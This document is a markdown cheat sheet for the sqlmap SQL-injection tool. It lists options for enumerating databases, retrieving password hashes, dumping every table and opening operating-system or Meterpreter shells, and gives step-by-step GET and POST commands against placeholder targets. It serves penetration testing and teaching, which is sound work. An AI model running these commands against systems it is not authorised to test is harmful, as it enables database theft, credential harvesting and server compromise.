## Basic Commands

> `sqlmap -h` # basic help menu  
> `sqlmap -hh` # advanced help menu

| Options           | Description                                              |
| ----------------- | -------------------------------------------------------- |
| -u URL, --url=URL | target URL (eg. 'https://www.example.com/vuln.php?id=1') |
| --data=DATA       | data string to be sent through POST (eg. id=1)           |
| --random-agent    | use randomly selected HTTP User-Agent header value       |
| -p TESTPARAMETER  | Testable parameter(s)                                    |
| --level=LEVEL     | level of tests to perform (1-5, default 1)               |
| --risk=RISK       | risk of tests to perform (1-3, default 1)                |

## Enumeration commands

| Options          | Description                                |
| ---------------- | ------------------------------------------ |
| -a, -all         | retrieve everything                        |
| -b, --banner     | retrieve DBMS banner                       |
| --current-user   | retrieve DBMS current user                 |
| --current-db     | retrieve DBMS current database             |
| --passwords      | enumerate DBMS users password hashes       |
| --dbs            | enumerate DBMS databases                   |
| --tables         | enumerate DBMS database tables             |
| --columns        | enumerate DBMS database table columns      |
| --schema         | enumerate DBMS schema                      |
| --dump           | dump DBMS database table entries           |
| --dump-all       | dump all DBMS databses tables entries      |
| --is-dba         | detect if the DBMS current user is DBA     |
| -D \<DB NAME>    | DBMS database to enumerate                 |
| -T \<TABLE NAME> | DBMS database table(s) to enumerate        |
| -C COL           | DBMS database table column(s) to enumerate |

## Operating System access commands

| Options        | Description                                           |
| -------------- | ----------------------------------------------------- |
| --os-shell     | prompt for an interactive operating system shell      |
| --os-pwn       | prompt for an OOB shell, Meterpreter or VNC           |
| --os-cmd=OSCMD | execute an OS command                                 |
| --priv-esc     | database process user privilege escalation            |
| --os-smbrelay  | one-click prompt for an OOB shell, meterpreter or VNC |

## Check database schema

### Simple HTTP GET test

```sh
sqlmap -u https://example.com/page.php?id=7 --dbs
```

- enumerate the database at that URL

### Simple HTTP POST test

- in Burp , POST request box > Right-click > Copy to file > save to request_file.txt

```sh
sqlmap -r <request_file.txt> -p <vulnerable_parameter> --dbs
```

## Check database tables

### GET method

```sh
sqlmap -u https://example.com/page.php?id=7 -D <db_name> --tables
```

### POST method

```sh
sqlmap -r <request_file.txt> -p <vulnerable_parameter> -D <db_name> --tables
```

## Check columns

### GET method

```sh
sqlmap -u https://example.com/page.php?id=7 -D <db_name> -T <table_name> --columns
```

### POST method

```sh
sqlmap -r <request_file.txt> -D <db_name> -T <table_name> --columns
```

## Dump all available databases and tables

### GET method

```sh
sqlmap -u <URL> -D <db_name> --dump-all
```

### POST method

```sh
sqlmap -r <request_file.txt> -D <db_name> --dump-all
```
